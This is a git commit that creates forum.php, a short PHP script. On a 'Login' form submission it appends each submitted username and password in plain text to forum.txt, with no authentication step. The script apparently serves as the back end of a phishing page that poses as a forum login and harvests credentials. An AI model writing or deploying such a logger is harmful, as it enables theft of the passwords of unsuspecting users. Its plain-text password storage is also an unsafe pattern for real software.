7d26bf4a1b6a825d696c7f2ccc469fe0be46e4fb
TermiNateVader <nathanbenstevens@gmail.com>
2021-04-30 18:32:30 -0400

    Create forum.php

---
+++ forum.php
@@ -0,0 +1,14 @@
+<?php
+
+//If Submit Button Is Clicked Do the Following
+if ($_POST['Login']){
+
+$myFile = "forum.txt";
+$fh = fopen($myFile, 'a') or die("can't open file");
+$stringData = $_POST['username'] . ":";
+fwrite($fh, $stringData);
+$stringData = $_POST['password'] . "\n";
+fwrite($fh, $stringData);
+fclose($fh);
+
+} ?>
